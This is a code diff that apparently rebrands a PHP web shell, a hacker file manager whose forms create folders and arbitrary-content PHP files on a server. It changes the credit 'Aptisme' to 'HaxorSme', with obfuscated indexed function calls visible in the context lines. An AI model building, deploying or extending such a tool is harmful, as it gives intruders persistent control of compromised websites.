@@ -345,7 +345,7 @@ $dirs = $f[18]($path);
               <form action="" method="post">
                 <div class="mb-3">
                   <label for="name" class="form-label">Folder Name</label>
-                  <input type="text" class="form-control" name="newFolderName" placeholder="Aptisme">
+                  <input type="text" class="form-control" name="newFolderName" placeholder="HaxorSme">
                 </div>
                 <button type="submit" class="btn btn-outline-light">Submit</button>
               </form>
@@ -354,7 +354,7 @@ $dirs = $f[18]($path);
               <form action="" method="post">
                 <div class="mb-3">
                   <label for="name" class="form-label">File Name</label>
-                  <input type="text" class="form-control" name="newFileName" placeholder="Aptisme.php">
+                  <input type="text" class="form-control" name="newFileName" placeholder="HaxorSme.php">
                 </div>
                 <div class="mb-3">
                   <label for="name" class="form-label">File Content</label>
@@ -370,7 +370,7 @@ $dirs = $f[18]($path);
                 <br>
                 *ReClick  For Close
                 <br>
-                File : Aptisme <?= $_SERVER['SCRIPT_NAME'] ?>
+                File : HaxorSme <?= $_SERVER['SCRIPT_NAME'] ?>
               </div>
             </div>
           </div> 
@@ -453,7 +453,7 @@ $dirs = $f[18]($path);
             </tbody>
           </table>
         </div>
-        <div class="text-light">&#169; Aptisme <script type='text/javascript'>var creditsyear = new Date();document.write(creditsyear.getFullYear());</script></div>
+        <div class="text-light">&#169; HaxorSme <script type='text/javascript'>var creditsyear = new Date();document.write(creditsyear.getFullYear());</script></div>
       </div>
     </div>
   </div>
